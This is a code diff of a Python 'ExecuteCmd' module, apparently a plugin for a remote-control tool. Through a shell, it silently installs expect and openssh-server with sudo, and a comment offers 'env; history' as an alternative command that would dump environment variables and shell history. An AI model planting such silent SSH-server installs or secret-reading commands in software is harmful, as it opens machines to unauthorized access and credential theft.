@@ -1,13 +1,13 @@
 import os
 import subprocess
 
-command="sudo apt-get install expect>/dev/null; sudo apt-get install openssh-server>/dev/null"    #"env; history"
+command="sudo apt-get install expect >/dev/null; sudo apt-get install openssh-server>/dev/null"    #"env; history"
 
 def run(**args):
   print("[*] In ExecuteCmd module.") #Todelete
   global command
   command = command.rstrip() #command devient tuple with args
-  print(command)
+  #print(command)
   try:
   	output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
   except:
@@ -23,3 +23,5 @@ def getUser():
 		userName = os.getenv("USER")
 	elif os.name == 'nt':
 		userName = os.getenv("USERNAME")
+
+#run()
